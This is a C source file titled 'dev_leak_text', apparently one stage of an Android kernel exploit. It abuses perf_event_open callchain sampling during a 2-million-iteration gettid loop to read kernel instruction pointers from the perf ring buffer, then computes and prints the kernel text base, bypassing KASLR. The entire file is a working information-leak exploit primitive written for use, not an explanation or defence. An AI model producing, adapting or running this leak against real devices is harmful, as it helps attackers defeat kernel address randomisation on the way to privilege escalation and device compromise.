/* dev_leak_text: KASLR text leak port (aquos ghostlock54 leak_text).
 * SW_CPU_CLOCK + IP|TID|CALLCHAIN, 2M gettid loop, min kernel IP,
 * snap (min & ~0x1fffff)+0x80000. Oracle: 0xffffffc0... = text base. */
#include <errno.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#ifndef SYS_perf_event_open
#define SYS_perf_event_open 241
#endif
#define PERF_EVENT_IOC_ENABLE _IO('$', 0)
#define PERF_EVENT_IOC_DISABLE _IO('$', 1)

static uint64_t ring_u64(const uint8_t *ring, uint64_t size, uint64_t pos)
{
    uint64_t v, off = pos & (size - 1);
    if (off + 8 <= size)
        memcpy(&v, ring + off, 8);
    else {
        uint8_t b[8];
        uint64_t first = size - off;
        memcpy(b, ring + off, first);
        memcpy(b + first, ring, 8 - first);
        memcpy(&v, b, 8);
    }
    return v;
}

int main(void)
{
    struct perf_event_attr a;
    setvbuf(stdout, NULL, _IONBF, 0);
    alarm(120);
    printf("dev_leak_text: CALLCHAIN min-IP KASLR leak trial\n");
    memset(&a, 0, sizeof(a));
    a.type = PERF_TYPE_SOFTWARE;
    a.size = sizeof(a);
    a.config = PERF_COUNT_SW_CPU_CLOCK;
    a.sample_period = 100000;
    a.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_CALLCHAIN;
    a.sample_max_stack = 32;
    a.disabled = 1;
    a.exclude_hv = 1;
    errno = 0;
    int fd = syscall(SYS_perf_event_open, &a, 0, -1, -1, 0);
    printf("perf_open: fd=%d errno=%d\n", fd, errno);
    if (fd < 0)
        return 2;
    long ps = sysconf(_SC_PAGESIZE);
    size_t msz = (size_t)ps * 33;
    struct perf_event_mmap_page *m =
        mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (m == MAP_FAILED)
        return 2;
    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    for (int i = 0; i < 2000000; i++)
        syscall(SYS_gettid);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
    __sync_synchronize();
    uint64_t head = m->data_head, tail = m->data_tail, min = ~0ULL, n = 0;
    uint8_t *ring = (uint8_t *)m + m->data_offset;
    uint64_t rs = m->data_size;
    while (tail + 16 <= head) {
        uint8_t hb[16];
        uint64_t off = tail & (rs - 1);
        if (off + 16 <= rs)
            memcpy(hb, ring + off, 16);
        else {
            size_t first = rs - off;
            memcpy(hb, ring + off, first);
            memcpy(hb + first, ring, 16 - first);
        }
        uint32_t type;
        uint16_t size;
        memcpy(&type, hb, 4);
        memcpy(&size, hb + 6, 2);
        if (size < 16 || tail + size > head)
            break;
        if (type == PERF_RECORD_SAMPLE) {
            uint64_t pos = tail + 8, ip = ring_u64(ring, rs, pos);
            pos += 16;
            uint64_t nr = ring_u64(ring, rs, pos);
            pos += 8;
            if (ip >= 0xffff000000000000ULL && ip < min) {
                min = ip;
                n++;
            }
            for (uint64_t i = 0; i < nr && pos + 8 <= tail + size; i++) {
                uint64_t x = ring_u64(ring, rs, pos);
                pos += 8;
                if (x >= 0xffff000000000000ULL && x < min) {
                    min = x;
                    n++;
                }
            }
        }
        tail += size;
    }
    munmap(m, msz);
    close(fd);
    if (min == ~0ULL) {
        printf("dev_leak_text: NO kernel IP (dead)\n");
        return 2;
    }
    printf("dev_leak_text: min_ip=%#llx n=%llu text_base=%#llx\n",
           (unsigned long long)min, (unsigned long long)n,
           (unsigned long long)((min & ~0x1fffffULL) + 0x80000));
    return 0;
}
